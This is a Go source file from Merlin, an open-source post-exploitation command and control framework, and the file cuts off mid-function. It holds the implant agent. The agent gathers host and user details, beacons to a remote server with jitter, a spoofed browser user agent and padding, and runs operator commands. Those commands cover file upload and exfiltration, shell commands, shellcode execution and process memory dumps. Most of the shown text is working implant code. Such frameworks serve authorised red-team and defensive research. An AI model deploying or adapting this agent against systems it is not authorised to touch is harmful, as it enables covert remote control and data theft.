// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2019  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package agent

import (
	// Standard
	"bytes"
	"crypto/sha1" // #nosec G505
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"time"

	// 3rd Party
	"github.com/fatih/color"
	"github.com/lucas-clemente/quic-go"
	"github.com/lucas-clemente/quic-go/h2quic"
	"github.com/satori/go.uuid"
	"golang.org/x/net/http2"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg"
	"github.com/Ne0nd0g/merlin/pkg/core"
	"github.com/Ne0nd0g/merlin/pkg/messages"
)

// GLOBAL VARIABLES
var build = "nonRelease" // build is the build number of the Merlin Agent program set at compile time

//TODO this is a duplicate with agents/agents.go, centralize

// Agent is a structure for agent objects. It is not exported to force the use of the New() function
type Agent struct {
	ID            uuid.UUID     // ID is a Universally Unique Identifier per agent
	Platform      string        // Platform is the operating system platform the agent is running on (i.e. windows)
	Architecture  string        // Architecture is the operating system architecture the agent is running on (i.e. amd64)
	UserName      string        // UserName is the username that the agent is running as
	UserGUID      string        // UserGUID is a Globally Unique Identifier associated with username
	HostName      string        // HostName is the computer's host name
	Ips           []string      // Ips is a slice of all the IP addresses assigned to the host's interfaces
	Pid           int           // Pid is the Process ID that the agent is running under
	iCheckIn      time.Time     // iCheckIn is a timestamp of the agent's initial check in time
	sCheckIn      time.Time     // sCheckIn is a timestamp of the agent's last status check in time
	Version       string        // Version is the version number of the Merlin Agent program
	Build         string        // Build is the build number of the Merlin Agent program
	WaitTime      time.Duration // WaitTime is how much time the agent waits in-between checking in
	PaddingMax    int           // PaddingMax is the maximum size allowed for a randomly selected message padding length
	MaxRetry      int           // MaxRetry is the maximum amount of failed check in attempts before the agent quits
	FailedCheckin int           // FailedCheckin is a count of the total number of failed check ins
	Skew          int64         // Skew is size of skew added to each WaitTime to vary check in attempts
	Verbose       bool          // Verbose enables verbose messages to standard out
	Debug         bool          // Debug enables debug messages to standard out
	Proto         string        // Proto contains the transportation protocol the agent is using (i.e. h2 or hq)
	Client        *http.Client  // Client is an http.Client object used to make HTTP connections for agent communications
	UserAgent     string        // UserAgent is the user agent string used with HTTP connections
	initial       bool          // initial identifies if the agent has successfully completed the first initial check in
	KillDate      int64         // killDate is a unix timestamp that denotes a time the executable will not run after (if it is 0 it will not be used)
}

// New creates a new agent struct with specific values and returns the object
func New(protocol string, verbose bool, debug bool) Agent {
	if debug {
		message("debug", "Entering agent.init() function")
	}
	a := Agent{
		ID:           uuid.NewV4(),
		Platform:     runtime.GOOS,
		Architecture: runtime.GOARCH,
		Pid:          os.Getpid(),
		Version:      merlin.Version,
		WaitTime:     30000 * time.Millisecond,
		PaddingMax:   4096,
		MaxRetry:     7,
		Skew:         3000,
		Verbose:      verbose,
		Debug:        debug,
		Proto:        protocol,
		UserAgent:    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36",
		initial:      false,
		KillDate:     0,
	}

	u, errU := user.Current()
	if errU != nil {
		if a.Debug {
			message("warn", "There was an error getting the username")
			message("warn", errU.Error())
		}
	} else {
		a.UserName = u.Username
		a.UserGUID = u.Gid
	}

	h, errH := os.Hostname()
	if errH != nil {
		if a.Debug {
			message("warn", "There was an error getting the hostname")
			message("warn", errH.Error())
		}
	} else {
		a.HostName = h
	}

	interfaces, errI := net.Interfaces()
	if errI != nil {
		if a.Debug {
			message("warn", "There was an error getting the the IP addresses")
			message("warn", errI.Error())
		}
	} else {
		for _, iface := range interfaces {
			addrs, err := iface.Addrs()
			if err == nil {
				for _, addr := range addrs {
					a.Ips = append(a.Ips, addr.String())
				}
			}
		}
	}

	client, errClient := getClient(a.Proto)
	if errClient == nil {
		a.Client = client
	} else {
		if a.Verbose {
			message("warn", errClient.Error())
		}
	}

	if a.Verbose {
		message("info", "Host Information:")
		message("info", fmt.Sprintf("\tAgent UUID: %s", a.ID))
		message("info", fmt.Sprintf("\tPlatform: %s", a.Platform))
		message("info", fmt.Sprintf("\tArchitecture: %s", a.Architecture))
		message("info", fmt.Sprintf("\tUser Name: %s", a.UserName)) //TODO A username like _svctestaccont causes error
		message("info", fmt.Sprintf("\tUser GUID: %s", a.UserGUID))
		message("info", fmt.Sprintf("\tHostname: %s", a.HostName))
		message("info", fmt.Sprintf("\tPID: %d", a.Pid))
		message("info", fmt.Sprintf("\tIPs: %v", a.Ips))
	}
	if debug {
		message("debug", "Leaving agent.New() function")
	}
	return a
}

// Run instructs an agent to establish communications with the passed in server using the passed in protocol
func (a *Agent) Run(server string) {
	rand.Seed(time.Now().UTC().UnixNano())

	if a.Verbose {
		message("note", fmt.Sprintf("Agent version: %s", merlin.Version))
		message("note", fmt.Sprintf("Agent build: %s", build))
	}

	for {
		// Check killdate to see if the agent should checkin
		if (a.KillDate == 0) || (time.Now().Unix() < a.KillDate) {
			if a.initial {
				if a.Verbose {
					message("note", "Checking in")
				}
				go a.statusCheckIn(server, a.Client)
			} else {
				a.initial = a.initialCheckIn(server, a.Client)
			}
			if a.FailedCheckin >= a.MaxRetry {
				if a.Verbose {
					message("warn", "Failed Checkin is greater than or equal to max retries. Quitting")
				}
				os.Exit(0)
			}
		} else {
			if a.Verbose {
				message("warn", fmt.Sprintf("Quitting. Agent Kill Date has been exceeded: %s",
					time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339)))
			}
			os.Exit(0)
		}

		timeSkew := time.Duration(rand.Int63n(a.Skew)) * time.Millisecond
		totalWaitTime := a.WaitTime + timeSkew

		if a.Verbose {
			message("note", fmt.Sprintf("Sleeping for %s at %s", totalWaitTime.String(), time.Now()))
		}
		time.Sleep(totalWaitTime)
	}
}

func (a *Agent) initialCheckIn(host string, client *http.Client) bool {

	if a.Debug {
		message("debug", "Entering initialCheckIn function")
	}

	// JSON "initial" payload object
	s := messages.SysInfo{
		Platform:     a.Platform,
		Architecture: a.Architecture,
		UserName:     a.UserName,
		UserGUID:     a.UserGUID,
		HostName:     a.HostName,
		Pid:          a.Pid,
		Ips:          a.Ips,
	}

	sysInfoPayload, errP := json.Marshal(s)

	if errP != nil {
		if a.Debug {
			message("warn", "There was an error marshaling the JSON object")
			message("warn", errP.Error())
		}
	}

	i := messages.AgentInfo{
		Version:       merlin.Version,
		Build:         build,
		WaitTime:      a.WaitTime.String(),
		PaddingMax:    a.PaddingMax,
		MaxRetry:      a.MaxRetry,
		FailedCheckin: a.FailedCheckin,
		Skew:          a.Skew,
		Proto:         a.Proto,
		SysInfo:       (*json.RawMessage)(&sysInfoPayload),
		KillDate:      a.KillDate,
	}

	agentInfoPayload, errA := json.Marshal(i)

	if errA != nil {
		if a.Debug {
			message("warn", "There was an error marshaling the JSON object")
			message("warn", errA.Error())
		}
	}

	// JSON message to be sent to the server
	g := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "InitialCheckIn", // TODO Can set this to a constant in messages.go
		Payload: (*json.RawMessage)(&agentInfoPayload),
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	b := new(bytes.Buffer)
	errJ := json.NewEncoder(b).Encode(g)
	if errJ != nil {
		if a.Verbose {
			message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s", errJ.Error()))
		}
		return false
	}
	if a.Verbose {
		message("note", fmt.Sprintf("Connecting to web server at %s for initial check in.", host))
	}
	req, reqErr := http.NewRequest("POST", host, b)
	if reqErr != nil {
		if a.Verbose {
			message("warn", reqErr.Error())
		}
	}
	req.Header.Set("User-Agent", a.UserAgent)
	req.Header.Set("Content-Type", "application/json; charset=utf-8")
	resp, err := client.Do(req)

	if err != nil {
		a.FailedCheckin++
		if a.Debug {
			message("warn", "There was an error with the HTTP client while performing a POST:")
			message("warn", err.Error())
		}
		if a.Verbose {
			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}
		if a.Debug {
			message("debug", "Leaving initialCheckIn function, returning False")
		}
		return false
	}
	if a.Debug {
		message("debug", "HTTP Response:")
		message("debug", fmt.Sprintf("%+v", resp))
	}
	if resp.StatusCode != 200 {
		a.FailedCheckin++
		if a.Verbose {
			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}
		if a.Debug {
			message("warn", "There was an error communicating with the server!")
			message("warn", fmt.Sprintf("Received HTTP Status Code: %d", resp.StatusCode))
		}
		if a.Debug {
			message("debug", "Leaving initialCheckIn function, returning False.")
		}
		return false
	}
	if a.FailedCheckin > 0 && a.FailedCheckin < a.MaxRetry {
		if a.Verbose {
			message("note", fmt.Sprintf("Updating server with failed checkins from %d to 0", a.FailedCheckin))
		}
		a.FailedCheckin = 0
		go a.agentInfo(host, a.Client)
	}
	if a.Debug {
		message("debug", "Leaving initialCheckIn function, returning True")
	}
	a.iCheckIn = time.Now().UTC()
	return true
}

func (a *Agent) statusCheckIn(host string, client *http.Client) {
	g := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "StatusCheckIn",
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	b := new(bytes.Buffer)
	errJ := json.NewEncoder(b).Encode(g)
	if errJ != nil {
		if a.Verbose {
			message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s", errJ.Error()))
		}
		return
	}

	if a.Verbose {
		message("note", fmt.Sprintf("Connecting to web server at %s for status check in.", host))
	}

	req, reqErr := http.NewRequest("POST", host, b)
	if reqErr != nil {
		if a.Verbose {
			message("warn", reqErr.Error())
		}
	}
	req.Header.Set("User-Agent", a.UserAgent)
	req.Header.Set("Content-Type", "application/json; charset=utf-8")
	resp, err := client.Do(req)

	if err != nil {
		if a.Debug {
			message("warn", "There was an error with the HTTP Response:")
			message("warn", err.Error()) // On Mac I get "read: connection reset by peer" here but not on other platforms
		} // Only does this with a 10s Sleep
		a.FailedCheckin++
		if a.Verbose {
			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}
		return
	}

	if a.Debug {
		message("debug", "HTTP Response:")
		message("debug", fmt.Sprintf("ContentLength: %d", resp.ContentLength))
		message("debug", fmt.Sprintf("%+v", resp))
	}

	if resp.StatusCode != 200 {
		a.FailedCheckin++
		if a.Verbose {
			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}
		if a.Debug {
			message("warn", "There was an error communicating with the server!")
			message("warn", fmt.Sprintf("Received HTTP Status Code: %d", resp.StatusCode))
		}
		return
	}

	if resp.ContentLength != 0 {
		var payload json.RawMessage
		j := messages.Base{
			Payload: &payload,
		}

		errD := json.NewDecoder(resp.Body).Decode(&j)
		if errD != nil {
			if a.Verbose {
				message("warn", fmt.Sprintf("There was an error decoding the JSON message:\r\n%s",
					errD.Error()))
			}
			a.FailedCheckin++
			return
		}

		a.FailedCheckin = 0
		a.sCheckIn = time.Now().UTC()

		if a.Debug {
			message("debug", fmt.Sprintf("Agent ID: %s", j.ID))
			message("debug", fmt.Sprintf("Message Type: %s", j.Type))
			message("debug", fmt.Sprintf("Message Payload: %s", j.Payload))
		} else if a.Verbose {
			message("success", fmt.Sprintf("%s Message Type Received!", j.Type))
		}
		switch j.Type { // TODO add self destruct that will find the .exe current path and start a new process to delete it after initial sleep
		case "FileTransfer":
			var p messages.FileTransfer
			errF := json.Unmarshal(payload, &p)
			if errF != nil {
				if a.Verbose {
					message("warn", fmt.Sprintf("There was an error unmarshalling the FileTransfer JSON "+
						"message:\r\n%s", errF.Error()))
				}
			}

			g := messages.Base{
				Version: 1.0,
				ID:      j.ID,
				Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
			}

			// Agent will be downloading a file from the server
			if p.IsDownload {
				if a.Verbose {
					message("note", "FileTransfer type: Download")
				}
				// Setup the message to submit the status of the upload
				c := messages.CmdResults{
					Job:    p.Job,
					Stdout: "",
					Stderr: "",
				}

				d, _ := filepath.Split(p.FileLocation)
				_, directoryPathErr := os.Stat(d)
				if directoryPathErr != nil {
					if a.Verbose {
						message("warn", fmt.Sprintf("There was an error getting the FileInfo structure for the directory %s", d))
						message("warn", directoryPathErr.Error())
					}
					c.Stderr = fmt.Sprintf("There was an error getting the FileInfo structure for the remote "+
						"directory %s:\r\n", p.FileLocation)
					c.Stderr += directoryPathErr.Error()
				}
				if c.Stderr == "" {
					if a.Verbose {
						message("note", fmt.Sprintf("Writing file to %s", p.FileLocation))
					}
					downloadFile, downloadFileErr := base64.StdEncoding.DecodeString(p.FileBlob)
					if downloadFileErr != nil {
						c.Stderr = downloadFileErr.Error()
						if a.Verbose {
							message("warn", "There was an error decoding the fileBlob")
							message("warn", downloadFileErr.Error())
						}
					} else {
						errF := ioutil.WriteFile(p.FileLocation, downloadFile, 0644)
						if errF != nil {
							c.Stderr = errF.Error()
							if a.Verbose {
								message("warn", fmt.Sprintf("There was an error writing to : %s", p.FileLocation))
								message("warn", errF.Error())
							}
						} else {
							if a.Verbose {
								message("success", fmt.Sprintf("Successfully download file to %s", p.FileLocation))
							}
							c.Stdout = fmt.Sprintf("Successfully uploaded file to %s on agent %s", p.FileLocation, a.ID.String())
						}
					}
				}

				k, err := json.Marshal(c)
				if err != nil {
					if a.Verbose {
						message("warn", fmt.Sprintf("There was an error marshalling the CmdResults JSON for"+
							" file download:\r\n%s", err.Error()))
					}
					break
				}
				g.Type = "CmdResults"
				g.Payload = (*json.RawMessage)(&k)
			}

			// Agent will uploading a file to the server
			if !p.IsDownload {
				if a.Verbose {
					message("note", "FileTransfer type: Upload")
				}

				fileData, fileDataErr := ioutil.ReadFile(p.FileLocation)
				if fileDataErr != nil {
					if a.Verbose {
						message("warn", fmt.Sprintf("There was an error reading %s", p.FileLocation))
						message("warn", fileDataErr.Error())
					}
					errMessage := fmt.Sprintf("There was an error reading %s\r\n", p.FileLocation)
					errMessage += fileDataErr.Error()
					c := messages.CmdResults{
						Job:    p.Job,
						Stderr: errMessage,
					}
					if a.Verbose {
						message("note", "Sending error message to sever.")
					}
					k, err := json.Marshal(c)
					if err != nil {
						if a.Verbose {
							message("warn", fmt.Sprintf("There was an error marshalling the CmdResults JSON for"+
								" file upload:\r\n%s", err.Error()))
						}
						break
					}
					g.Type = "CmdResults"
					g.Payload = (*json.RawMessage)(&k)

				} else {
					fileHash := sha1.New() // #nosec G401 // Use SHA1 because it is what many Blue Team tools use
					_, errW := io.WriteString(fileHash, string(fileData))
					if errW != nil {
						if a.Verbose {
							message("warn", fmt.Sprintf("There was an error generating the SHA1 file hash e:\r\n%s", errW.Error()))
						}
					}

					if a.Verbose {
						message("note", fmt.Sprintf("Uploading file %s of size %d bytes and a SHA1 hash of %x to the server",
							p.FileLocation,
							len(fileData),
							fileHash.Sum(nil)))
					}
					c := messages.FileTransfer{
						FileLocation: p.FileLocation,
						FileBlob:     base64.StdEncoding.EncodeToString([]byte(fileData)),
						IsDownload:   true,
						Job:          p.Job,
					}

					k, err := json.Marshal(c)
					if err != nil {
						if a.Verbose {
							message("warn", fmt.Sprintf("There was an error marshalling the CmdPayload JSON "+
								"message:\r\n%s", err.Error()))
						}
						break
					}
					g.Type = "FileTransfer"
					g.Payload = (*json.RawMessage)(&k)

				}
			}
			b2 := new(bytes.Buffer)
			err1 := json.NewEncoder(b2).Encode(g)
			if err1 != nil {
				if a.Verbose {
					message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s",
						err1.Error()))
				}
				break
			}
			resp2, respErr := client.Post(host, "application/json; charset=utf-8", b2)
			if respErr != nil {
				if a.Verbose {
					message("warn", "There was an error sending the FileTransfer message to the server")
					message("warn", respErr.Error())
				}
				break
			}
			if resp2.StatusCode != 200 {
				if a.Verbose {
					message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
				}
			}
		case "CmdPayload":
			var p messages.CmdPayload
			err2 := json.Unmarshal(payload, &p)
			if err2 != nil {
				if a.Verbose {
					message("warn", fmt.Sprintf("There was an error unmarshalling the CmdPayload JSON "+
						"message:\r\n%s", err2.Error()))
				}
			}
			stdout, stderr := a.executeCommand(p) // TODO this needs to be its own routine so the agent can continue to function while it is going

			c := messages.CmdResults{
				Job:    p.Job,
				Stdout: stdout,
				Stderr: stderr,
			}

			k, err := json.Marshal(c)
			if err != nil {
				if a.Verbose {
					message("warn", fmt.Sprintf("There was an error marshalling the CmdPayload JSON "+
						"message:\r\n%s", err.Error()))
				}
				break
			}
			g := messages.Base{
				Version: 1.0,
				ID:      j.ID,
				Type:    "CmdResults",
				Payload: (*json.RawMessage)(&k),
				Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
			}
			b2 := new(bytes.Buffer)
			err3 := json.NewEncoder(b2).Encode(g)
			if err3 != nil {
				if a.Verbose {
					message("warn", fmt.Sprintf("There was an error encoding the CmdPayload JSON "+
						"message:\r\n%s", err3.Error()))
				}
				break
			}
			if a.Verbose {
				message("note", fmt.Sprintf("Sending response to server: %s", stdout))
			}
			resp2, errR := client.Post(host, "application/json; charset=utf-8", b2)
			if errR != nil {
				if a.Verbose {
					message("warn", fmt.Sprintf("There was an error with the POST request:\r\n%s",
						errR.Error()))
				}
				break
			}
			if resp2.StatusCode != 200 {
				if a.Verbose {
					message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d",
						resp2.StatusCode))
				}
			}
		case "ServerOk":
			if a.Verbose {
				message("note", "Received Server OK, doing nothing")
			}
		case "Module":
			if a.Verbose {
				message("note", "Received Agent Module Directive")
			}
			var p messages.Module
			e := json.Unmarshal(payload, &p)
			if e != nil {
				if a.Verbose {
					message("warn", fmt.Sprintf("There was an error encoding the CmdPayload JSON "+
						"message:\r\n%s", e.Error()))
				}
				break
			}
			switch p.Command {
			case "Minidump":
				//args: []string{process name, pid, temppath}
				if a.Verbose {
					message("note", "Received Minidump request")
				}
				//ensure the provided args are valid
				if len(p.Args) < 2 {
					//not enough args
					if a.Verbose {
						message("warn", fmt.Sprintf("Not enough args were provided to dump a process"))
					}
					break
				}
				process := p.Args[0]
				pid, err := strconv.ParseInt(p.Args[1], 0, 32)
				if err != nil {
					if a.Verbose {
						message("warn", fmt.Sprintf("Could not parse PID as an integer:%s\r\n%s",
							p.Args[1], err.Error()))
					}
					break
				}

				tempPath := ""
				if len(p.Args) == 3 {
					tempPath = p.Args[2]
				}

				// Get minidump
				miniD, miniDumpErr := miniDump(tempPath, process, uint32(pid))

				//copied and pasted from upload func, modified appropriately
				if miniDumpErr != nil {
					if a.Verbose {
						message("warn", fmt.Sprintf("There was an error executing the miniDump module:\r\n%s",
							miniDumpErr.Error()))
					}
					errMessage := fmt.Sprintf("There was an error executing the miniDump module:\r\n%s",
						miniDumpErr.Error())
					c := messages.CmdResults{
						Job:    p.Job,
						Stderr: errMessage,
					}
					if a.Verbose {
						message("note", "Sending error message to sever.")
					}
					k, err := json.Marshal(c)
					if err != nil {
						if a.Verbose {
							message("warn", fmt.Sprintf("There was an error creating the json:\r\n%s", err.Error()))
						}
					}
					g.Type = "CmdResults"
					g.Payload = (*json.RawMessage)(&k)

				} else {
					fileHash := sha256.New()
					_, errW := io.WriteString(fileHash, string(miniD["FileContent"].([]byte)))
					if errW != nil {
						if a.Verbose {
							message("warn", fmt.Sprintf("There was an error generating the SHA256 file hash e:\r\n%s", errW.Error()))
						}
					}

					if a.Verbose {
						message("note", fmt.Sprintf("Uploading minidump file of size %d bytes and a SHA1 hash of %x to the server",
							//p.FileLocation,
							len(miniD["FileContent"].([]byte)),
							fileHash.Sum(nil)))
					}
					c := messages.FileTransfer{
						FileLocation: fmt.Sprintf("%s.%d.dmp", miniD["ProcName"], miniD["ProcID"]),
						FileBlob:     base64.StdEncoding.EncodeToString(miniD["FileContent"].([]byte)),
						IsDownload:   true,
						Job:          p.Job,
					}
					k, err := json.Marshal(c)
					if err != nil {
						if a.Verbose {
							message("warn", "There was an error creating the json")
							message("warn", err.Error())
						}
					}
					g.Type = "FileTransfer"
					g.Payload = (*json.RawMessage)(&k)
				}

				b2 := new(bytes.Buffer)
				err1 := json.NewEncoder(b2).Encode(g)
				if err1 != nil {
					if a.Verbose {
						message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s",
							err1.Error()))
					}
					break
				}
				resp2, respErr := client.Post(host, "application/json; charset=utf-8", b2)
				if respErr != nil {
					if a.Verbose {
						message("warn", "There was an error sending the FileTransfer message to the server")
						message("warn", respErr.Error())
					}
					break
				}
				if resp2.StatusCode != 200 {
					if a.Verbose {
						message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
					}
				}

			}
		case "AgentControl":
			if a.Verbose {
				message("note", "Received Agent Control Message")
			}
			var p messages.AgentControl
			err4 := json.Unmarshal(payload, &p)
			if err4 != nil {
				if a.Verbose {
					message("warn", fmt.Sprintf("There was an error unmarshalling the AgentControl "+
						"JSON message:\r\n%s", err4.Error()))
				}
			}

			switch p.Command {
			case "kill":
				if a.Verbose {
					message("note", "Received Agent Kill Message")
				}
				os.Exit(0)
			case "sleep":
				if a.Verbose {
					message("note", fmt.Sprintf("Setting agent sleep time to %s", p.Args))
				}
				t, err := time.ParseDuration(p.Args)
				if err != nil {
					if a.Verbose {
						message("warn", "There was an error changing the agent waitTime")
						message("warn", err.Error())
					}
				}
				if t > 0 {
					a.WaitTime = t
					a.agentInfo(host, client)
				} else {
					if a.Verbose {
						message("warn", "The agent was provided with a time that was not greater than zero.")
						message("warn", fmt.Sprintf("The provided time was: %s", t.String()))
					}
				}
			case "skew":
				t, err := strconv.ParseInt(p.Args, 10, 64)
				if err != nil {
					if a.Verbose {
						message("warn", "There was an error changing the agent skew interval")
						message("warn", err.Error())
					}
				}
				if a.Verbose {
					message("note", fmt.Sprintf("Setting agent skew interval to %d", t))
				}
				a.Skew = t
				a.agentInfo(host, client)
			case "padding":
				t, err := strconv.Atoi(p.Args)
				if err != nil {
					if a.Verbose {
						message("warn", "There was an error changing the agent message padding size")
						message("warn", err.Error())
					}
				}
				if a.Verbose {
					message("note", fmt.Sprintf("Setting agent message maximum padding size to %d", t))
				}
				a.PaddingMax = t
				a.agentInfo(host, client)
			case "initialize":
				if a.Verbose {
					message("note", "Received agent re-initialize message")
				}
				a.initial = false
			case "maxretry":

				t, err := strconv.Atoi(p.Args)
				if err != nil {
					if a.Verbose {
						message("warn", "There was an error changing the agent max retries")
						message("warn", err.Error())
					}
				}
				if a.Verbose {
					message("note", fmt.Sprintf("Setting agent max retries to %d", t))
				}
				a.MaxRetry = t
				a.agentInfo(host, client)
			case "killdate":
				d, err := strconv.Atoi(p.Args)
				if err != nil {
					if a.Verbose {
						message("warn", fmt.Sprintf("There was an error converting the kill date to an "+
							"integer:\r\n%s", err.Error()))
					}
					break
				}
				a.KillDate = int64(d)
				if a.Verbose {
					message("info", fmt.Sprintf("Set Kill Date to: %s",
						time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339)))
				}
				a.agentInfo(host, client)
			default:
				if a.Verbose {
					message("warn", fmt.Sprintf("Unknown AgentControl message type received %s", p.Command))
				}
			}
		case "Shellcode":
			if a.Verbose {
				message("note", "Received Execute shellcode command")
			}

			var s messages.Shellcode
			var e error
			var so string
			var se string

			errShellcode := json.Unmarshal(payload, &s)

			if errShellcode != nil {
				e = errShellcode
			} else {
				e = a.executeShellcode(s) // Execution method determined in function
			}

			if e != nil {
				se = e.Error()
				so = ""
				if a.Verbose {
					message("warn", fmt.Sprintf("There was an error: %s", se))
				}
			} else {
				so = "Shellcode executed successfully"
				se = ""
			}

			c := messages.CmdResults{
				Job:    s.Job,
				Stdout: so,
				Stderr: se,
			}

			k, errMarshal := json.Marshal(c)

			if errMarshal != nil {
				if a.Verbose {
					message("warn", "There was an error marshalling the CmdResults message in the shellocde section")
					message("warn", errMarshal.Error())
				}
			}

			g := messages.Base{
				Version: 1.0,
				ID:      j.ID,
				Type:    "CmdResults",
				Payload: (*json.RawMessage)(&k),
				Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
			}

			b2 := new(bytes.Buffer)

			errEncode := json.NewEncoder(b2).Encode(g)

			if a.Verbose {
				if errEncode != nil {
					message("warn", fmt.Sprintf("There was an error encoding the JSON message\r\n%s", errEncode.Error()))
					break
				} else {
					message("note", fmt.Sprintf("Sending response to server: %s", so))
				}
			}

			if a.Debug {
				message("info", fmt.Sprintf("About to send POST to server for job %s "+
					"\r\nSTDOUT:\r\n%s\r\nSTDERR:\r\n%s", s.Job, so, se))
			}

			resp2, errPost := client.Post(host, "application/json; charset=utf-8", b2)

			if errPost != nil {
				if a.Verbose {
					message("warn", "There was an error sending the CmdResults message to the server in the shellcode section")
					message("warn", errPost.Error())
				}
				break
			}

			if resp2.StatusCode != 200 {
				if a.Verbose {
					message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
				}
			}
		case "NativeCmd":
			var p messages.NativeCmd
			err5 := json.Unmarshal(payload, &p)
			if err5 != nil {
				if a.Verbose {
					message("warn", fmt.Sprintf("There was an error unmarshalling the NativeCmd JSON "+
						"message:\r\n%s", err5.Error()))
				}
			}

			switch p.Command {
			case "ls":
				listing, err := a.list(p.Args)
				var se string
				if err != nil {
					se = err.Error()
					if a.Verbose {
						message("warn", fmt.Sprintf("ls command returned STDERR: %s", err.Error()))
					}
				}

				c := messages.CmdResults{
					Job:    p.Job,
					Stdout: listing,
					Stderr: se,
				}

				k, err := json.Marshal(c)
				if err != nil {
					if a.Verbose {
						message("warn", fmt.Sprintf("There was an error encoding the JSON payload for the"+
							"ls command:\r\n%s", err.Error()))
					}
				}

				g := messages.Base{
					Version: 1.0,
					ID:      j.ID,
					Type:    "CmdResults",
					Payload: (*json.RawMessage)(&k),
					Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
				}
				b2 := new(bytes.Buffer)
				err6 := json.NewEncoder(b2).Encode(g)
				if err6 != nil {
					if a.Verbose {
						message("warn", fmt.Sprintf("There was an error encoding the JSON message for the"+
							" ls command results:\r\n%s", err6.Error()))
					}
					break
				}
				if a.Verbose {
					message("note", fmt.Sprintf("Sending response to server: %s", listing))
				}
				resp2, errR := client.Post(host, "application/json; charset=utf-8", b2)
				if errR != nil {
					if a.Verbose {
						message("warn", fmt.Sprintf("There was an error with the POST request:\r\n%s",
							errR.Error()))
					}
					break
				}
				if resp2.StatusCode != 200 {
					if a.Verbose {
						message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d",
							resp2.StatusCode))
					}
				}
			case "cd":
				var se string
				var stdout string
				err := os.Chdir(p.Args)
				if err != nil {
					se = err.Error()
					if a.Verbose {
						message("warn", fmt.Sprintf("cd command returned STDERR: %s", err.Error()))
					}
				} else {
					path, pathErr := os.Getwd()
					if pathErr != nil {
						se = pathErr.Error()
					} else {
						stdout = fmt.Sprintf("Changed working directory to %s", path)
					}
				}

				c := messages.CmdResults{
					Job:    p.Job,
					Stdout: stdout,
					Stderr: se,
				}

				k, err := json.Marshal(c)
				if err != nil {
					if a.Verbose {
						message("warn", fmt.Sprintf("There was an error encoding the JSON payload for the"+
							"ls command:\r\n%s", err.Error()))
					}
				}

				g := messages.Base{
					Version: 1.0,
					ID:      j.ID,
					Type:    "CmdResults",
					Payload: (*json.RawMessage)(&k),
					Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
				}
				b2 := new(bytes.Buffer)
				err7 := json.NewEncoder(b2).Encode(g)
				if err7 != nil {
					if a.Verbose {
						message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s", err7.Error()))
					}
					break
				}
				if a.Verbose {
					message("note", fmt.Sprintf("Sending response to server: %s", stdout))
				}
				resp2, errPost := client.Post(host, "application/json; charset=utf-8", b2)
				if errPost != nil {
					if a.Verbose {
						message("warn", "There was an error sending the CmdResults message to the server in the shellcode section")
						message("warn", errPost.Error())
					}
					break
				}
				if resp2.StatusCode != 200 {
					if a.Verbose {
						message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
					}
				}
			case "pwd":
				var se string
				dir, err := os.Getwd()
				if err != nil {
					se = err.Error()
					if a.Verbose {
						message("warn", fmt.Sprintf("pwd command returned STDERR: %s", err.Error()))
					}
				}

				c := messages.CmdResults{
					Job:    p.Job,
					Stdout: fmt.Sprintf("Current working directory: %s", dir),
					Stderr: se,
				}

				k, err := json.Marshal(c)
				if err != nil {
					if a.Verbose {
						message("warn", fmt.Sprintf("There was an error encoding the JSON message for the"+
							"ls command results:\r\n%s", err.Error()))
					}
				}

				g := messages.Base{
					Version: 1.0,
					ID:      j.ID,
					Type:    "CmdResults",
					Payload: (*json.RawMessage)(&k),
					Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
				}
				b2 := new(bytes.Buffer)
				err8 := json.NewEncoder(b2).Encode(g)
				if err8 != nil {
					if a.Verbose {
						message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s", err8.Error()))
					}
					break
				}
				if a.Verbose {
					message("note", fmt.Sprintf("Sending response to server: %s", dir))
				}
				resp2, errPost := client.Post(host, "application/json; charset=utf-8", b2)
				if errPost != nil {
					if a.Verbose {
